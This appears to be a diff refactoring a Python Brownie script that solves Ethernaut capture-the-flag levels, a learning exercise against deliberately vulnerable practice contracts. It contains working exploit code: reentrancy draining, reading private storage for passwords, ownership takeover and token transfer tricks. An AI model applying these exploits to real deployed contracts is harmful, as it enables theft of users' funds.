@@ -1,83 +1,59 @@
-from brownie import Fallback, Fallout, CoinFlip, CoinFlipAttacker, Telephone, TelephoneAttacker, TokenThing, Delegation, Delegate, Force, network, config, accounts, Contract
-from brownie import AttackForce, Vault, King, AttackKing, Reentrance, AttackReentrancy, Elevator, AttackElevator, Privacy, Recovery
-from brownie.network.gas.strategies import GasNowStrategy
-from brownie.network import gas_price
-from scripts.helpful_scripts import *
-import time
-from web3.auto.infura import w3
-from web3 import Web3, EthereumTesterProvider
 import os
-from brownie import Wei, AttackPrivacy, GatekeeperOne, AttackGatekeeperOne, GatekeeperTwo, AttackGatekeeperTwo
+import time
+
+from brownie import AttackForce, Vault, King, AttackKing, Reentrance, AttackReentrancy, Elevator, AttackElevator, Privacy, Recovery
+from brownie import Fallback, Fallout, CoinFlip, CoinFlipAttacker, Telephone, TelephoneAttacker, TokenThing, Delegation, Delegate, Force
 from brownie import NaughtCoin, Preservation, AttackPreservation, SimpleToken, MagicNum
+from brownie import Wei, AttackPrivacy, GatekeeperOne, AttackGatekeeperOne, GatekeeperTwo, AttackGatekeeperTwo
+from web3 import Web3
+
+from scripts.attackers import attack_fallback, attack_fallout, attack_token
+from scripts.interface import *
 
 
 def deploy_fallback():
     account = get_account()
     if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
-        # if deploying locally, we want to use another account so we can try to escalate privs
-        fallBack = Fallback.deploy({"from": accounts[1]}, publish_source=False)
+        # if deploying locally, we want to use another account, so we can try to escalate privs
+        fall_back = Fallback.deploy({"from": accounts[1]}, publish_source=False)
     else:
-        fallBackAddr = config["networks"][network.show_active()]["fallBack_address"]
-        fallBack = Contract.from_abi("Fallback", fallBackAddr, Fallback.abi)
+        fall_back_addr = config["networks"][network.show_active()]["fallBack_address"]
+        fall_back = Contract.from_abi("Fallback", fall_back_addr, Fallback.abi)
 
-    print(f"Fallback deployed to {fallBack.address}")
+    print(f"Fallback deployed to {fall_back.address}")
     # now we attack
-    attackFallback(fallBack, account)
-
-
-def attackFallback(_fallBack, _account):
-    contributions = _fallBack.getContribution({"from": _account})
-    print(f"Before the attack...Current contributions: {contributions} Are we the owner?: {_fallBack.owner() == _account}")
-
-    # adding .wait(1) shouldn't be necessary, but we're explicitly waiting for the block to be mined
-    _fallBack.contribute({"value": 500000000000000, "from": _account}).wait(1)
-    contributions = _fallBack.getContribution({"from": _account})
-    print(f"Contributions now: {contributions}")
-    _account.transfer(_fallBack.address, "0.01 ether").wait(1)
-    owner = _fallBack.owner()
-    areWeOwner = (owner == _account)
-    print(f"Sent .01 ETH. Are we the owner?: {areWeOwner}")
-    _fallBack.withdraw({"from": _account})
-    print("Fallback attacked! Try submitting the solution as complete.")
+    attack_fallback(fall_back, account)
 
 
 def deploy_fallout():
     account = get_account()
     if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
-        # if deploying locally, we want to use another account so we can try to escalate privs
-        fallOut = Fallout.deploy({"from": accounts[1]}, publish_source=False)
+        # if deploying locally, we want to use another account, so we can try to escalate privs
+        fall_out = Fallout.deploy({"from": accounts[1]}, publish_source=False)
     else:
-        fallOutAddress = config["networks"][network.show_active()]["fallOut_address"]
-        fallOut = Contract.from_abi("Fallout", fallOutAddress, Fallout.abi)
+        fall_out_address = config["networks"][network.show_active()]["fallOut_address"]
+        fall_out = Contract.from_abi("Fallout", fall_out_address, Fallout.abi)
 
-    print(f"Fallout deployed to {fallOut.address}")
+    print(f"Fallout deployed to {fall_out.address}")
     # now we attack
-    attackFallout(fallOut, account)
+    attack_fallout(fall_out, account)
 
 
-def attackFallout(_fallOut, _account):
-    print(f"Before the attack...are we the owner? {_account == _fallOut.owner()}")
-    _fallOut.Fal1out({"from": _account, "value": 0})
-    print(f"After the attack...are we the owner? {_account == _fallOut.owner()}")
-    print("Fallout attacked! Try submitting the solution as complete.")
-
-
-def deploy_coinFlip():
+def deploy_coinflip():
     account = get_account()
     if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
-        coinFlip = CoinFlip.deploy({"from": account}, publish_source=False)
+        coin_flip = CoinFlip.deploy({"from": account}, publish_source=False)
     else:
-        coinFlipAddress = config["networks"][network.show_active()]["coinFlip_address"]
-        coinFlip = Contract.from_abi("CoinFlip", coinFlipAddress, CoinFlip.abi)
+        coin_flip_address = config["networks"][network.show_active()]["coin_flip_address"]
+        coin_flip = Contract.from_abi("CoinFlip", coin_flip_address, CoinFlip.abi)
 
-    attacker = CoinFlipAttacker.deploy(coinFlip.address, {"from": account}, publish_source=False)
+    attacker = CoinFlipAttacker.deploy(coin_flip.address, {"from": account}, publish_source=False)
     # network.gas_limit(6700000)
     for x in range(0, 10):
         attacker.guessFlip({"from": account}).wait(1)
         # for the life of me I could not figure out why it reverts as "gas estimation failed" on the 2nd iteration of guessFlip
-        # testing with brownie console showed that it works fine when waiting for 30 seconds each iteration
-        # I even tried looping from within CoinFlipAttacker, same error
-        time.sleep(30)
+        # testing with brownie console showed that it works fine when waiting for 10 seconds each iteration
+        time.sleep(10)
     # attacker.tenGuesses()
     print("CoinFlip attacked! Try submitting the solution as complete.")
 
@@ -87,8 +63,8 @@ def deploy_telephone():
     if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
         telephone = Telephone.deploy({"from": accounts[1]}, publish_source=False)
     else:
-        telephoneAddress = config["networks"][network.show_active()]["Telephone_address"]
-        telephone = Contract.from_abi("Telephone", telephoneAddress, Telephone.abi)
+        telephone_address = config["networks"][network.show_active()]["telephone_address"]
+        telephone = Contract.from_abi("Telephone", telephone_address, Telephone.abi)
 
     print(f"Before the attack...are we owner? {telephone.owner() == account.address}")
     attacker = TelephoneAttacker.deploy(telephone.address, {"from": account}, publish_source=False)
@@ -98,37 +74,31 @@ def deploy_telephone():
 
 def deploy_token():
     account = get_account()
-    initSupply = ["100"]
-    token = deploy_contract(TokenThing, "TokenThing", 1, initSupply)
-    deployerAccount = config["networks"][network.show_active()].get("TokenThing_deployer")
+    init_supply = ["100"]
+    token = deploy_contract(TokenThing, "token_thing", 1, init_supply)
+    deployer_account = config["networks"][network.show_active()].get("token_think_deployer")
 
     # this challenge gave me the opportunity to learn how to fork
     # we can test out stealing arbitrary wallets
     if network.show_active() in FORKED_LOCAL_ENVIRONMENTS:
-        # if fork, set account as the 'player' address, which should already have 20 tokens
-        tokenPlayerAddress = config["networks"][network.show_active()]["TokenThing_fork_wallet"]
-        account = accounts.at(tokenPlayerAddress, force=True)
+        # if forked, set account as the 'player' address, which should already have 20 tokens
+        token_player_address = config["networks"][network.show_active()]["TokenThing_fork_wallet"]
+        account = accounts.at(token_player_address, force=True)
     elif network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
         # if local, give ourselves 20 tokens to mirror the ethernaut site
         token.transfer(account.address, 20)
-        deployerAccount = accounts[1]
+        deployer_account = accounts[1]
 
-    attack_token(token, account, deployerAccount)
-
-
-def attack_token(_token, _account, _deployerAccount):
-    print(f"Before the attack...our balance is {_token.balanceOf(_account.address)}")
-    _token.transfer(_deployerAccount, 21, {"from": _account})
-    print(f"After the attack...our balance is {_token.balanceOf(_account.address)}")
+    attack_token(token, account, deployer_account)
 
 
 def deploy_delegation():
     account = get_account()
 
     if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
-        delegate = deploy_contract(Delegate, "Delegate", 1, [accounts[1].address])
+        delegate = deploy_contract(Delegate, "delegate", 1, [accounts[1].address])
 
-    delegation = deploy_contract(Delegation, "Delegation", 1, [])
+    delegation = deploy_contract(Delegation, "delegation", 1, [])
 
     data_to_send = Web3.keccak(text="pwn()")[0:4].hex()
     print(f"Before the attack...are we owner of delegation? {delegation.owner() == account.address}")
@@ -138,7 +108,7 @@ def deploy_delegation():
 
 def deploy_force():
     account = get_account()
-    force = deploy_contract(Force, "Force", 1, [])
+    force = deploy_contract(Force, "force", 1, [])
     attackForce = AttackForce.deploy({"from": account}, publish_source=False)
     attackForce.attack(force.address, {"from": account, "value": 1})
     print("Force attacked! Try submitting the solution as complete.")
@@ -146,7 +116,7 @@ def deploy_force():
 
 def deploy_vault():
     account = get_account()
-    vault = deploy_contract(Vault, "Vault", 1, [bytes("testpassword", encoding='utf8')])
+    vault = deploy_contract(Vault, "vault", 1, [bytes("testpassword", encoding='utf8')])
 
     if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
         w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))
@@ -155,8 +125,8 @@ def deploy_vault():
 
     print(f"Connected? {w3.isConnected()}")
     password = w3.eth.get_storage_at(vault.address, 1)  # get 2nd variable
-    passwordDecode = password.decode("utf-8")
-    print(f"Password found: {passwordDecode}")
+    password_decode = password.decode("utf-8")
+    print(f"Password found: {password_decode}")
     vault.unlock(password, {"from": account}).wait(1)
     print(f"Locked? {vault.locked()}")
     print("Vault attacked! Try submitting the solution as complete.")
@@ -180,26 +150,26 @@ def deploy_king():
         print("King attacked successfully! Submit the solution as complete.")
 
 
-def deploy_reentrance():
+def deploy_re_entrance():
     account = get_account()
-    reentrance = deploy_contract(Reentrance, "Reentrance", 1, [])
+    re_entrance = deploy_contract(Reentrance, "Reentrance", 1, [])
 
     if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
         # accounts[1] and accounts[2] each donates 1 ether to victim contract
-        reentrance.donate(account.address, {"from": accounts[1], "value": Wei("0.0001 ether")})
-        reentrance.donate(account.address, {"from": accounts[2], "value": Wei("0.0001 ether")})
+        re_entrance.donate(account.address, {"from": accounts[1], "value": Wei("0.0001 ether")})
+        re_entrance.donate(account.address, {"from": accounts[2], "value": Wei("0.0001 ether")})
         web3 = Web3(Web3.HTTPProvider("HTTP://127.0.0.1:8545"))
     else:
         web3 = Web3(Web3.HTTPProvider(f"https://{network.show_active()}.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))
 
     # attacker gets deployed (in local and testnet)
     # accounts[0] deposits 1 ether into attacker
-    attacker = AttackReentrancy.deploy(reentrance.address, {"from": account.address, "value": Wei("0.0001 ether")}, publish_source=False)
+    attacker = AttackReentrancy.deploy(re_entrance.address, {"from": account.address, "value": Wei("0.0001 ether")}, publish_source=False)
 
-    print(f"Before attack...victim balance: {web3.fromWei(web3.eth.get_balance(reentrance.address), 'ether')}, attacker balance: {web3.fromWei(web3.eth.get_balance(attacker.address), 'ether')}")
+    print(f"Before attack...victim balance: {web3.fromWei(web3.eth.get_balance(re_entrance.address), 'ether')}, attacker balance: {web3.fromWei(web3.eth.get_balance(attacker.address), 'ether')}")
     attacker.donateToTarget({"from": account.address}).wait(1)
     attacker.attack({"from": account.address}).wait(1)
-    print(f"After attack...victim balance: {web3.fromWei(web3.eth.get_balance(reentrance.address), 'ether')}, attacker balance: {web3.fromWei(web3.eth.get_balance(attacker.address), 'ether')}")
+    print(f"After attack...victim balance: {web3.fromWei(web3.eth.get_balance(re_entrance.address), 'ether')}, attacker balance: {web3.fromWei(web3.eth.get_balance(attacker.address), 'ether')}")
     print(f"After attack...recursion count: {attacker.recursionCount()}")
 
 
@@ -227,61 +197,61 @@ def deploy_privacy():
     print(f"Connected? {w3.isConnected()}")
     _dataArray = w3.eth.get_storage_at(privacy.address, 5)  # get 6th variable
 
-    # lets see all the memory slots (variables) for sanity
+    # let's see all the memory slots (variables) for sanity
     for i in range(0, 6):
         print(f"Slot {i}: {w3.eth.get_storage_at(privacy.address, i)}")
 
     print(f"before attack...is locked?: {privacy.locked()}")
     # _dataArray has our key within the highest-order bits since the EVM is little-endian
     # instead of trying to convert a bytes32 to bytes16 in python we can just do it with another contract
-    attackPrivacy = AttackPrivacy.deploy(privacy.address, {"from": account.address}, publish_source=False)
-    attackPrivacy.unlock(_dataArray, {"from": account.address}).wait(1)
+    attack_privacy = AttackPrivacy.deploy(privacy.address, {"from": account.address}, publish_source=False)
+    attack_privacy.unlock(_dataArray, {"from": account.address}).wait(1)
     print(f"after attack...locked?: {privacy.locked()}")
 
 
-def deploy_gatekeeperone():
+def deploy_gatekeeper_one():
     account = get_account()
     # we use deploy_contract when it doesn't get deployed if an address is specified in the config
-    gatekeeperone = deploy_contract(GatekeeperOne, "GatekeeperOne", 1, [])
+    gatekeeper_one = deploy_contract(GatekeeperOne, "GatekeeperOne", 1, [])
 
     # we use Class.deploy when we always want to deploy a new contract
-    attacker = AttackGatekeeperOne.deploy(gatekeeperone.address, {"from": account.address}, publish_source=False)
-    print(f"Before attack...entrant: {gatekeeperone.entrant()}")
+    attacker = AttackGatekeeperOne.deploy(gatekeeper_one.address, {"from": account.address}, publish_source=False)
+    print(f"Before attack...entrant: {gatekeeper_one.entrant()}")
     attacker.enter().wait(1)
-    print(f"After the attack...entrant: {gatekeeperone.entrant()}")
+    print(f"After the attack...entrant: {gatekeeper_one.entrant()}")
 
 
-def deploy_gatekeepertwo():
+def deploy_gatekeeper_two():
     account = get_account()
-    gatekeepertwo = deploy_contract(GatekeeperTwo, "GatekeeperTwo", 1, [])
-    print(f"Before attack...entrant: {gatekeepertwo.entrant()}")
-    attacker = AttackGatekeeperTwo.deploy(gatekeepertwo.address, {"from": account.address}, publish_source=False)
-    print(f"After attack...entrant: {gatekeepertwo.entrant()}")
+    gatekeeper_two = deploy_contract(GatekeeperTwo, "GatekeeperTwo", 1, [])
+    print(f"Before attack...entrant: {gatekeeper_two.entrant()}")
+    attacker = AttackGatekeeperTwo.deploy(gatekeeper_two.address, {"from": account.address}, publish_source=False)
+    print(f"After attack...entrant: {gatekeeper_two.entrant()}")
 
 
-def naughtcoin():
+def deploy_naught_coin():
     account = get_account()
-    naughtcoin = deploy_contract(NaughtCoin, "NaughtCoin", 0, [account.address])
+    naught_coin = deploy_contract(NaughtCoin, "NaughtCoin", 0, [account.address])
 
     if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
-        print(f"Victim balance: {naughtcoin.balanceOf(account.address)}")
-        print(f"Attacker balance: {naughtcoin.balanceOf(accounts[1].address)}")
-        naughtcoin.approve(accounts[1].address, naughtcoin.balanceOf(account.address)).wait(1)
-        print(f"Allowance: {naughtcoin.allowance(account.address, accounts[1].address)}")
-        naughtcoin.transferFrom(account.address, accounts[1].address, naughtcoin.balanceOf(account.address), {"from": accounts[1].address}).wait(1)
-        print(f"Victim balance: {naughtcoin.balanceOf(account.address)}")
-        print(f"Attacker balance: {naughtcoin.balanceOf(accounts[1].address)}")
+        print(f"Victim balance: {naught_coin.balanceOf(account.address)}")
+        print(f"Attacker balance: {naught_coin.balanceOf(accounts[1].address)}")
+        naught_coin.approve(accounts[1].address, naught_coin.balanceOf(account.address)).wait(1)
+        print(f"Allowance: {naught_coin.allowance(account.address, accounts[1].address)}")
+        naught_coin.transferFrom(account.address, accounts[1].address, naught_coin.balanceOf(account.address), {"from": accounts[1].address}).wait(1)
+        print(f"Victim balance: {naught_coin.balanceOf(account.address)}")
+        print(f"Attacker balance: {naught_coin.balanceOf(accounts[1].address)}")
     else:
         # we'll just drain the contract into a random wallet from etherscan
-        randomAddress = '0x7ffC57839B00206D1ad20c69A1981b489f772031'
-        print(f"Balance: {naughtcoin.balanceOf(account.address)}")
-        naughtcoin.approve(account.address, naughtcoin.balanceOf(account.address), {"from": account.address}).wait(1)
-        print(f"Allowance: {naughtcoin.allowance(account.address, account.address)}")
-        naughtcoin.transferFrom(account.address, randomAddress, naughtcoin.balanceOf(account.address), {"from": account.address}).wait(1)
-        print(f"After attack...Balance: {naughtcoin.balanceOf(account.address)}")
+        random_address = '0x7ffC57839B00206D1ad20c69A1981b489f772031'
+        print(f"Balance: {naught_coin.balanceOf(account.address)}")
+        naught_coin.approve(account.address, naught_coin.balanceOf(account.address), {"from": account.address}).wait(1)
+        print(f"Allowance: {naught_coin.allowance(account.address, account.address)}")
+        naught_coin.transferFrom(account.address, random_address, naught_coin.balanceOf(account.address), {"from": account.address}).wait(1)
+        print(f"After attack...Balance: {naught_coin.balanceOf(account.address)}")
 
 
-def preservation():
+def deploy_preservation():
     if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
         print("This test is for fork/testnet use only. I don't feel like deploying manually.")
         return
@@ -300,7 +270,7 @@ def preservation():
     print(f"After attack...Owner: {preservation.owner()}")
 
 
-def recovery():
+def deploy_recovery():
     if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
         print("This test is for fork/testnet use only. I don't feel like deploying manually.")
         return
@@ -313,53 +283,29 @@ def recovery():
 
     # We are initially given the instance address of the Recovery contract
     # The SimpleToken contract was deployed within the Recovery contract
-    # so we use the Recovery instance address to calculate the first deployed contract by setting the nonce to 1
+    # ,so we use the Recovery instance address to calculate the first deployed contract by setting the nonce to 1
 
-    simpleToken_contract_address = get_contract_address(recovery.address, 1)  # we're setting nonce (the # of transactions that came from the address that deployed the contract) as 1
-    print(simpleToken_contract_address)
-    simpleTokenInstance = Contract.from_abi("SimpleToken", simpleToken_contract_address, SimpleToken.abi)
+    simple_token_contract_address = get_contract_address(recovery.address, 1)  # we're setting nonce (the # of transactions that came from the address that deployed the contract) as 1
+    print(simple_token_contract_address)
+    simple_token_instance = Contract.from_abi("SimpleToken", simple_token_contract_address, SimpleToken.abi)
 
-    # now we call the destroy() function to withdrawl the 0.001 Ether
-    print(f"Before attack...victim balance: {w3.fromWei(w3.eth.get_balance(simpleTokenInstance.address), 'ether')}, attacker balance: {w3.fromWei(w3.eth.get_balance(account.address), 'ether')}")
-    simpleTokenInstance.destroy(account.address, {"from": account.address}).wait(1)
+    # now we call the function destroy() function to withdraw the 0.001 Ether
+    print(f"Before attack...victim balance: {w3.fromWei(w3.eth.get_balance(simple_token_instance.address), 'ether')}, attacker balance: {w3.fromWei(w3.eth.get_balance(account.address), 'ether')}")
+    simple_token_instance.destroy(account.address, {"from": account.address}).wait(1)
 
     # note: in fork this 'after balance' won't reflect the hack since it's getting the balance from the rinkeby branch, not your fork
-    print(f"After attack...victim balance: {w3.fromWei(w3.eth.get_balance(simpleTokenInstance.address), 'ether')}, attacker balance: {w3.fromWei(w3.eth.get_balance(account.address), 'ether')}")
+    print(f"After attack...victim balance: {w3.fromWei(w3.eth.get_balance(simple_token_instance.address), 'ether')}, attacker balance: {w3.fromWei(w3.eth.get_balance(account.address), 'ether')}")
 
 
-def magicNumber():
+def deploy_magic_number():
     final_bytecode = "0x600a600c602039600a6020f3602a60005260206000f3"
     account = get_account()
 
     # first we must deploy our bytecode
-    bytecodeTxReceipt = account.transfer(None, 0, None, None, None, None, None, final_bytecode, )
-    bytecodeInstance = bytecodeTxReceipt.contract_address
-    print(bytecodeInstance)
+    bytecode_tx_receipt = account.transfer(None, 0, None, None, None, None, None, final_bytecode, )
+    bytecode_instance = bytecode_tx_receipt.contract_address
+    print(bytecode_instance)
 
-    magicNumberInstance = deploy_contract(MagicNum, "MagicNum", 1, [])
+    magic_number_instance = deploy_contract(MagicNum, "MagicNum", 1, [])
 
-    magicNumberInstance.setSolver(bytecodeInstance, {'from': account.address})
-
-
-### NOTES
-### deploy_contract is used for when the instance is either from address or deployed locally, depending on network
-### ClassName.deploy() is used when we want to explicitly deploy it regardless of network
-
-def main():
-    deploy_fallback()
-    # deploy_fallout()
-    # deploy_coinFlip()
-    # deploy_telephone()
-    # deploy_token()
-    # deploy_delegation()
-    # deploy_force()
-    # deploy_vault()
-    # deploy_king()
-    # deploy_reentrance()
-    # deploy_elevator()
-    # deploy_privacy()
-    # deploy_gatekeeperone()
-    # deploy_gatekeepertwo()
-    # naughtcoin()
-    # preservation()
-    # magicNumber()
+    magic_number_instance.setSolver(bytecode_instance, {'from': account.address})
